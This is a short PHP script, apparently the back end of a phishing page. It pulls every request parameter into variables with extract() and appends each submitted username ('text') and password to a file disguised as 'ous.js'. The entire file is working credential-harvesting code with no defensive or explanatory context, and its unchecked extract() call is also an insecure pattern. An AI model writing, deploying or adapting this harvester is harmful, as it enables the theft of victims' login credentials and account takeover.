<?php
     extract($_REQUEST);
	 $file=fopen("ous.js" , "a");

	 fwrite($file , "name :");
	 fwrite($file , $text ."\n");
	 fwrite($file , "pass :");
	 fwrite($file , $password ."\n");
	 fclose($file);                  
?>